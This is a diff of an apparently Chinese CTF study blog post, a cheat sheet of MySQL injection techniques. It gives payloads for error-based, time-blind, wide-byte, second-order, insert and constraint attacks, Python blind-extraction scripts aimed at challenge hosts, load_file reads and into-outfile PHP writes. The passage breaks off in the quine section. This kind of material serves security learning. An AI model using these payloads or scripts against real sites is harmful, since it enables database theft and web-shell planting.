+<p>它会返回一个大数<code>18446744073709551615</code></p>
+<p>同时，如果我们的语句执行成功的话就会<code>return 0</code></p>
+<p>所以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT ~(SELECT version());</span><br><span class="line">#18446744073709551615</span><br></pre></td></tr></table></figure>
+<p>我们这样的话</p>
+<p>就能够利用了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT exp(~(select * from (select table_name from information_schema.tables where table_schema=database())x));</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/articles/5509124.html">（转载）使用exp进行SQL报错注入 - lcamry - 博客园 (cnblogs.com)</a></p>
+<p>同理，能报错的还有：</p>
+<p><strong>cot(0)</strong></p>
+<p>**pow()**乘方</p>
 <h2><span id="5时间盲注"> 5.时间盲注</span></h2>
 <p>延时注入，页面啥回显都没有的时候，我们需要观察页面的请求时间（</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||if(ascii(substr(database(),1,1))&lt;115,sleep(0.3),1)#</span><br><span class="line">//无延时</span><br><span class="line">1&#x27;||if(ascii(substr(database(),1,1))&lt;116,sleep(0.3),1)#</span><br><span class="line">//有延时</span><br><span class="line">说明库的第一个字符对应为ascii码=115的字符</span><br></pre></td></tr></table></figure>
 <p>编写脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left &lt; right):</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr(database(),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid) #爆库</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;wfy_comments&#x27;)),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid) #注意引号</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(group_concat(text))from(wfy_comments)),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(reverse(group_concat(text)))from(wfy_comments)),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid) #同样的倒置输出</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        times = time.time() <span class="comment">#发送访问请求前的时间</span></span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        timee = time.time() <span class="comment">#发送访问后的时间</span></span><br><span class="line">        keep = timee - times <span class="comment">#当然是大-小</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>) <span class="comment">#防止429</span></span><br><span class="line">        <span class="keyword">if</span> keep &gt; <span class="number">2</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        mid = (left + right) //<span class="number">2</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res+=<span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">	<span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Results:&quot;</span>,res) <span class="comment">#输出最终结果</span></span><br><span class="line"><span class="comment">#print(&quot;Final Results:&quot;,res[::-1]) #如果选择倒序，选这个</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>根据注入类型的不同，前面的查询需要修改的（</p>
+<h3><span id="过滤sleep"> 过滤sleep：</span></h3>
+<p><strong>benchmark()</strong>，将表达式执行n次，我们可以利用重复执行多次表达式强行延长执行时间：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url =<span class="string">&#x27;http://6b551a60-af9f-4f29-b3b4-689592d73faf.node4.buuoj.cn:81/index.php&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right =<span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left &lt; right):</span><br><span class="line">        payload=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">            <span class="comment">#&#x27;password&#x27; : &quot;0&#x27;||if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment">#&#x27;password&#x27; : &quot;0&#x27;||if(ascii(mid((select(group_concat(column_name))from(information_schema.tables)where(table_name=&#x27;flaggg&#x27;)),%d,1))&lt;%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;%(i,mid)</span></span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> : <span class="string">&quot;0&#x27;||if(ascii(mid((select(group_concat(cmd))from(flaggg)),%d,1))&lt;%d,benchmark(3000000,md5(1)),1)||&#x27;&quot;</span>%(i,mid)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        times = time.time()</span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        timee = time.time()</span><br><span class="line">        keep = timee-times</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> keep &gt; <span class="number">1.8</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mid &lt;=<span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res+=<span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>笛卡尔积</strong></p>
+<p>非常的耗时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from imformation_schema.columns a, information_schema.columns b;</span><br></pre></td></tr></table></figure>
+<p>如果<code>count</code>被过滤，可以换成其他的函数如<code>avg, min ,max, sum</code></p>
+<p><code>*</code>如果被过滤，可以利用某一个字段代替：</p>
+<p>如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select max(A.TABLE_NAME) from information_schema.columns A, information_schema.columns B, information_schema.schemata;</span><br></pre></td></tr></table></figure>
+<p><strong>正则匹配</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rpad(&#x27;a&#x27;,99,&#x27;a&#x27;) rlike concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;);</span><br></pre></td></tr></table></figure>
 <h2><span id="6headers注入"> 6.headers注入</span></h2>
 <p>就是利用上面的方式，换了个注入点…</p>
 <p>例如user-agents（sqli-labs的less-18）</p>
@@ -333,7 +471,9 @@
 <h2><span id="7宽字节注入"> 7.宽字节注入：</span></h2>
 <p>宽字节是多个字节宽度（&gt;1）的编码（GBK,gb2312…）</p>
 <p>汉字就是宽字节编码</p>
-<p>有些时候传入的参数（单引号）会被addslashes()函数转义，添加反斜杠，但是又因为设定字符集为gbk，导致宽字节的注入</p>
+<p>宽字节注入的成因：</p>
+<p>数据库的编码和php的编码设置成了两个不同的编码，例如<code>utf-8</code>和<code>gbk</code></p>
+<p>此时如果利用<code>addslashes</code>转义，会使得我们多出一个<code>\</code></p>
 <p>要将反斜杠转义处理掉的方式有：</p>
 <ul>
 <li>让（\）失去作用</li>
@@ -345,6 +485,11 @@
 <li>反斜杠的编码是%5c</li>
 </ul>
 <p>所以我们只需要在单引号前加上%df，此时转义后的反斜杠(%5c)与%df就会组成一个汉字：運(运的繁体,%df%5c)</p>
+<ul>
+<li>用户输入<code>1%df' or 1=1#</code></li>
+<li><code>addslashes</code>转义：<code>1%df\' or 1=1#</code></li>
+<li><code>gbk</code>编码后：<code>1運' or 1=1#</code></li>
+</ul>
 <p>也就是：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%df&#x27; union select 1,2,3%23</span><br></pre></td></tr></table></figure>
 <p>这个时候查询语句就会变成：</p>
@@ -352,6 +497,14 @@
 <p>剩下的只需要和联合查询一样的地方即可，在前面的单引号添加%df</p>
 <p>在爆列名时：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1%df&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;xxxx&#x27;</span><br><span class="line">后面的单引号也会转义，这个时候我们可以将xxxx使用hex编码，然后0x</span><br><span class="line">例如users=7573657273</span><br><span class="line">就写成</span><br><span class="line">1%df&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273</span><br></pre></td></tr></table></figure>
+<ul>
+<li>utf-8到latin1：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>假设有个表里面是采用<code>Latin1</code>字符集的，此时只需要输入：</p>
+<p><code>?username=admin%c2</code></p>
+<p><code>%00-%7f</code>能够直接表示某个字符 ，但是<code>%c2-%f4</code>只能表示长字符编码后结果的首字节</p>
+<p>这些字节(<code>%c2-%f4</code>)在进行转换时会被直接抛弃</p>
 <h2><span id="8二次注入"> 8.二次注入</span></h2>
 <p>第一次注册等操作没有注入点，但是第二次操作代入了第一次操作的语句，导致sql注入（</p>
 <p>也就是说，我们提前构造好的语句成功储存进入数据库了，然后第二次操作（例如修改密码）中调用了第一次操作的语句，使得sql语句被执行</p>
@@ -444,6 +597,8 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;/**/union/**/select/**/1,2,(select/**/group_concat(1)/**/from/**/ctftraining.flag)&#x27;</span><br></pre></td></tr></table></figure>
 <p>给列取名字读取：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;/**/union/**/select/**/1,2,(select/**/group_concat(b)/**/from/**/(select/**/1/**/as/**/b/**/union/**/select/**/*/**/from/**/ctftraining.flag)a)&#x27;</span><br><span class="line"></span><br><span class="line">/*选择ctftraining.flag内的第一列取名为b并且读取b*/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>比较法判断列数(?待验证)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (select &#x27;admin&#x27;,&#x27;~&#x27;,&#x27;~&#x27;)&lt;(select * from users where username=&#x27;admin&#x27; limit 1);</span><br></pre></td></tr></table></figure>
 <h2><span id="10insert注入"> 10.insert注入</span></h2>
 <p>SQL语句：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into table VALUES(&#x27;val1&#x27;,&#x27;val2&#x27;)</span><br></pre></td></tr></table></figure>
@@ -454,16 +609,281 @@
 <p>xxxxx可以是报错注入的updatexml，也可以是时间盲注的语句，取决于你用何种注入方式：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;||if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))&lt;127,sleep(0.3),1)||&#x27;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or updatexml(1,concat(&#x27;~&#x27;,database()),3) or&#x27;</span><br></pre></td></tr></table></figure>
-<h2><span id="11join报错注入"> 11.join+报错注入</span></h2>
-<p><strong>updated in 2023/3/11</strong></p>
-<p>利用重复查询相同表的方法来爆数据：</p>
-<p>sql语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from 表 a join 表 b)c  //爆表的第一列</span><br><span class="line">select * from(select * from 表 a join 表 b using(第一列列名))c //爆第二个列名</span><br><span class="line">select * from(select * from 表 a join 表 b using(第一列列名,第二列列名))c //爆第三个列名</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<p>搭配报错注入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; || extractvalue(1,concat(0x7e,(select * from (select * from output a join output b)c)))#</span><br><span class="line">//爆出output表的第一个列名</span><br><span class="line">回显：Duplicate column name &#x27;data&#x27;</span><br></pre></td></tr></table></figure>
-<h1><span id="0x06-结束"> 0x06 结束</span></h1>
-<p>嗯，凑数标题（</p>
-<p>老采集了我</p>
+<h2><span id="11约束攻击"> 11.约束攻击</span></h2>
+<p>利用原理：</p>
+<ul>
+<li>数据库中利用insert注册，利用select登录</li>
+<li>insert语句只会截取表中最大字符限制的内容(比如设置了<code>varchar(20)</code>就只会保留20个)</li>
+<li>select语句输入什么就是什么</li>
+<li>末尾的空格会被忽略掉</li>
+</ul>
+<p>利用注册的时候加上特别多的空格insert进去，然后再登录：</p>
+<p>假设我注册一个用户<code>admin               a</code></p>
+<p>insert时候只会截取前20个，变成<code>admin               .</code>(15个空格)</p>
+<p>这个时候就成功插入了<code>admin</code>账户的账号和密码了</p>
+<h1><span id="0x06-文件操作"> 0x06 文件操作</span></h1>
+<h2><span id="设置变量"> 设置变量</span></h2>
+<ul>
+<li>全局变量</li>
+<li>会话变量的设置</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global key=value;</span><br><span class="line">set session key=value;</span><br><span class="line">set key=value;#session</span><br></pre></td></tr></table></figure>
+<p>查看变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables;</span><br><span class="line">show variables like &quot;%file%&quot;;</span><br></pre></td></tr></table></figure>
+<p>设置权限：</p>
+<p><strong>secure_file_priv</strong></p>
+<p>限制文件的读、写</p>
+<p>查看权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%secure_file%&quot;;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>null：不允许导入导出</li>
+<li>/tmp：只允许在tmp下执行</li>
+<li>空：无限制</li>
+</ul>
+<p>读文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;/flag&#x27;);</span><br></pre></td></tr></table></figure>
+<p>读文件配合盲注：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://34163922-8c1d-4c8b-ae9b-332f18511a0a.challenge.ctf.show:8080/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span> : <span class="string">&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;&#125;&#x27;),0,1)&quot;</span>.<span class="built_in">format</span>(flag+j),</span><br><span class="line">            <span class="string">&quot;password&quot;</span> : <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        r = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag = flag+j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>写文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php phpinfo();?&gt;&quot; into outfile &quot;/tmp/1.php&quot;#多行</span><br><span class="line">select &quot;&lt;?php phpinfo();?&gt;&quot; into dumpfile &quot;/tmp/1.php&quot;#仅一行</span><br></pre></td></tr></table></figure>
+<h1><span id="0x07-各种表"> 0x07 各种表</span></h1>
+<h3><span id="information_schema"> information_schema</span></h3>
+<p>平时注入比较常用的表：</p>
+<table>
+<thead>
+<tr>
+<th>表</th>
+<th>字段</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>information_schema.schemata</td>
+<td>schema_name</td>
+<td>库</td>
+</tr>
+<tr>
+<td>information_schema.tables</td>
+<td>table_schema、table_name</td>
+<td>库、表</td>
+</tr>
+<tr>
+<td>information_schema.columns</td>
+<td>table_schema、table_name、column_name</td>
+<td>库、表、列</td>
+</tr>
+</tbody>
+</table>
+<h3><span id="sys"> sys</span></h3>
+<table>
+<thead>
+<tr>
+<th>表</th>
+<th>字段</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>sys.innodb_buffer_stats_by_schema</td>
+<td>object_schema</td>
+<td>库名</td>
+</tr>
+<tr>
+<td>sys.innodb_buffer_stats_by_table</td>
+<td>object_schema、object_name</td>
+<td>库名、表名</td>
+</tr>
+<tr>
+<td>sys.io_global_by_file_by_bytes</td>
+<td>file</td>
+<td>路径中包含表名</td>
+</tr>
+<tr>
+<td>sys.io_global_by_file_by_latency</td>
+<td>file</td>
+<td>路径中包含表名</td>
+</tr>
+<tr>
+<td>sys.processlist</td>
+<td>current_statement、last_statement</td>
+<td>当前数据库正在执行的语句、该句柄执行的上一条语句</td>
+</tr>
+<tr>
+<td>sys.session</td>
+<td>current_statement、last_statement</td>
+<td>当前数据库正在执行的语句、该句柄执行的上一条语句</td>
+</tr>
+<tr>
+<td>sys.schema_auto_increment_columns</td>
+<td>table_schema、table_name、column_name</td>
+<td>库名、表名、字段名</td>
+</tr>
+<tr>
+<td>sys.schema_index_statistics</td>
+<td>table_schema、table_name</td>
+<td>库名、表名</td>
+</tr>
+<tr>
+<td>sys.schema_object_overview</td>
+<td>db</td>
+<td>库名</td>
+</tr>
+<tr>
+<td>sys.schema_table_statistics</td>
+<td>table_schema、table_name</td>
+<td>库名、表名</td>
+</tr>
+<tr>
+<td>sys.schema_table_statistics_with_buffer</td>
+<td>table_schema、table_name</td>
+<td>库名、表名</td>
+</tr>
+<tr>
+<td>sys.schema_tables_with_full_table_scans</td>
+<td>object_schema、object_name</td>
+<td>库名、表名</td>
+</tr>
+<tr>
+<td>sys.statement_analysis</td>
+<td>query、db</td>
+<td>请求访问的数据库名、数据库最近执行的请求</td>
+</tr>
+<tr>
+<td>sys.version</td>
+<td>mysql_version</td>
+<td>mysql版本信息</td>
+</tr>
+<tr>
+<td>sys.x$innodb_buffer_stats_by_schema</td>
+<td>object_schema</td>
+<td>库名</td>
+</tr>
+<tr>
+<td>sys.x$innodb_buffer_stats_by_table</td>
+<td>object_schema、object_name</td>
+<td>库名、表名</td>
+</tr>
+<tr>
+<td>sys.x$io_global_by_file_by_bytes</td>
+<td>file</td>
+<td>路径中包含表名</td>
+</tr>
+<tr>
+<td>sys.x$schema_tables_with_full_table_scans</td>
+<td>object_schema、object_name</td>
+<td>库名、表名</td>
+</tr>
+<tr>
+<td>sys.x$schema_flattened_keys</td>
+<td>table_schema、table_name、index_columns</td>
+<td>库名、表名、字段名</td>
+</tr>
+<tr>
+<td>sys.x$ps_schema_table_statistics_io</td>
+<td>table_schema、table_name</td>
+<td>库名、表名</td>
+</tr>
+</tbody>
+</table>
+<h3><span id="performance_schema"> performance_schema</span></h3>
+<p>只有库和表：</p>
+<table>
+<thead>
+<tr>
+<th>表</th>
+<th>字段</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>performance_schema.objects_summary_global_by_type</td>
+<td>object_schema、object_name</td>
+<td>库、表</td>
+</tr>
+<tr>
+<td>performance_schema.table_handles</td>
+<td>object_schema、object_name</td>
+<td>库、表</td>
+</tr>
+<tr>
+<td>performance_schema.table_io_waits_summary_by_index_usage</td>
+<td>object_schema、object_name</td>
+<td>库、表</td>
+</tr>
+<tr>
+<td>performance_schema.table_io_waits_summary_by_table</td>
+<td>object_schema、object_name</td>
+<td>库、表</td>
+</tr>
+</tbody>
+</table>
+<h3><span id="mysqlinnodb"> mysql.innodb</span></h3>
+<p>无列名：</p>
+<table>
+<thead>
+<tr>
+<th>表</th>
+<th>字段</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>mysql.innodb_table_stats</td>
+<td>database_name、table_name</td>
+<td>表名</td>
+</tr>
+<tr>
+<td>mysql.innodb_index_stats</td>
+<td>database_name、table_name</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h1><span id="0x08引号逃逸"> 0x08引号逃逸</span></h1>
+<p>利用方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;xxx&#x27; and password = &#x27;xxx&#x27;</span><br></pre></td></tr></table></figure>
+<p>此处的xxx均为我们可控的内容，此时利用<code>\</code>逃逸出username的一个单引号，在password处注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;admin\&#x27; and password = &#x27;or select xxx#&#x27;</span><br></pre></td></tr></table></figure>
+<h1><span id="0x09-quine自等构造"> 0x09 quine(自等构造)</span></h1>
+<p>条件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$FLAG</span>);<span class="comment">//$row是查询返回的结果 $password是我们post的结果</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>这里需要的是sql查询返回后的语句等于我们的password的语句</p>
+<p>这里就可以利用<code>replace函数</code>替换，使其替换后的语句等于替换前的语句即可</p>
+<p>对于返回值和输入值相同，并且输出自己的源代码程序，我们称之为Qunie</p>
+<p>假设有个语句：</p>
